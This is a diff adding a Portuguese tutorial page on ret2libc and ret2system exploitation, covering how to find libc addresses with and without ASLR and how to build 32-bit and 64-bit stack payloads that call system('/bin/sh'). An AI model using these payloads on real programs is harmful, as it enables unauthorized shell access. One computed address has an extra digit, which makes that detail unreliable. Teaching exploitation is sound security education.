@@ -1,0 +1,126 @@
+---
+title: ret2libc
+sidebar_position: 4
+---
+
+ret2libc é um caso de ROP onde usamos uma função qualquer da libc (biblioteca de funções padrão do C), `system()`, `execve()`, `mprotect()`, `gets()`, etc.]
+
+Como exemplo, vamos fazer um ret2libc com a função `system()`, que é a mais comum, pois executa qualquer comando e pode abrir uma shell.
+
+## Antes: Como achar os endereços?
+
+### Sem ASLR
+
+Tudo fica no mesmo lugar de sempre.
+
+Passo 1: Encontre onde a libc está carregada com `ldd` (List Dynamic Dependencies - lista bibliotecas dinâmicas que o programa precisa, como `libc`)
+
+```
+$ ldd ./programa_vulneravel
+    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7dc0000)
+    # ↑ Aqui! Base da libc = 0x00007ffff7dc0000
+```
+
+Passo 2: Encontre os "offsets" (distâncias)
+
+```
+$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep " system"
+  235: 000000000004c350    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5
+    # ↑ Offset do system = 0x4c350
+
+$ strings -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
+ 1b5d0f8 /bin/sh
+    # ↑ Offset do /bin/sh = 0x1b5d0f8
+```
+
+Passo 3: Some base + offset
+```
+system_addr = 0x00007ffff7dc0000 + 0x4c350 = 0x7ffff7e0c350
+bin_sh_addr = 0x00007ffff7dc0000 + 0x1b5d0f8 = 0x7ffff7f75d0f8
+```
+
+### Com ASLR
+
+Precisamos vazar um endereço primeiro.
+
+Parte 1: Vazar um endereço conhecido
+
+```
+payload1 = padding + puts_addr + volta_para_main + puts_got
+# puts(puts@got) vai imprimir o endereço REAL do puts
+```
+
+Parte 2: Calcular base da libc
+```
+leaked_puts = recebe_do_programa()  # Ex: 0x7ffff7e3d420
+libc_base = leaked_puts - puts_offset  # 0x7ffff7dc0000
+system_addr = libc_base + system_offset
+```
+
+## ret2system
+
+
+ret2system é um caso de ROP ret2libc onde usamos a função `system()`. Essa função executa um comando shell qualquer (abrir app, `ls`, `/bin/sh`, etc).
+
+Para fazer um ret2system:
+
+1. Chama-se `system()` no return address
+2. Coloca-se `exit()` após return address. Quando `system()` retornar, `exit()` será executado. (saída limpa)
+3. Coloca-se argumento para system após `exit()`
+
+Para entender como chamar `system()` e passar os parâmetros, recomendo ver o material [Convenção de chamada de funções](/docs/extra/call-convention).
+
+### Para x86 (32-bit):
+
+```
+payload = b"A" * 76           # Preencher buffer até return address
+payload += p32(0xb7e3d850)   # system()    ← Sobrescreve return address
+payload += p32(0xb7e2f5c0)   # exit()      ← Executado quando system() retornar
+payload += p32(0xb7f5d0f8)   # "/bin/sh"   ← Argumento para system()!
+                            #             ↑ ESP+4 (frame antigo) ou EBP+8 (frame novo) quando system() começa
+```
+
+Isso ocorre pois, após chamar system (`pop eip`), `esp` atual = exit(). O system() vai fazer `push rbp`, `mov rbp, rsp`, e teremos:
+
+```
+EBP   → EBP antigo (lixo agora, por causa do BOF)
+EBP+4 → exit() (return address)
+EBP+8 → 1° parâmetro
+```
+
+Isto, pois system() internamente faz:
+
+```
+; system() em x86 (32-bit)
+system:
+    push    ebp                 ; Salva frame pointer antigo
+    mov     ebp, esp            ; Novo frame pointer
+    sub     esp, 0x10           ; Aloca espaço para variáveis locais
+    mov     eax, [ebp+8]        ; Pega primeiro argumento (comando)
+    mov     [esp], eax          ; Prepara argumento para função interna
+    call    do_system           ; Função interna real
+    ; ... mais código ...
+    ret
+
+; system() em x64 (64-bit)  
+system:
+    push    rbp                 ; Salva frame pointer
+    mov     rbp, rsp            ; Novo frame pointer  
+    sub     rsp, 0x10           ; Espaço local
+    mov     QWORD PTR [rsp], rdi  ; Salva argumento na stack para função interna
+    call    do_system           ; Função interna real
+    ; ... mais código ...
+    ret
+```
+
+### para x86-64 (64-bit)
+
+Basta usar um gadget ROP para colocar o primeiro parâmetro em `rdi`, já que os parâmetros são pegos dos registradores.
+
+```py
+payload = b"A" * 72            # Padding até RIP
+payload += p64(0x4011ab)       # gadget: pop rdi; ret
+payload += p64(0x7ffff7f5d0f8) # "/bin/sh" em RDI
+payload += p64(0x7ffff7e1e350) # system()
+payload += p64(0x7ffff7e11420) # exit() - opcional
+```
